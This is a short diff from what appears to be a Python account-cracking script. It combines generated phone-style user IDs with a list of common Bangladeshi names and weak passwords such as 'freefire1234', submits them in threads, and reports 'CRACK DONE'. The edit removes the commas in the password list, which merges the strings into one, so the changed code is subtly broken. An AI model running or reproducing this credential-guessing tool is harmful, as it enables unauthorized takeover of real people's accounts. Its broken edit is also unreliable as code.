@@ -72,7 +72,7 @@ def Main():
 		print(50*'━')
 		for guru in user:
 			uid = kode+kodex+kod+guru
-            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234']
+            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh' 'sadiya' 'hridoy' 'sahin' 'nusrat' 'fatema' 'sabbir'' mababa' '708090' '908070' 'free fire' 'freefire1234']
 			yaari.submit(test,uid,pwx,tl)
 	print(50*'━')
 	print(' <> CRACK DONE......... ')
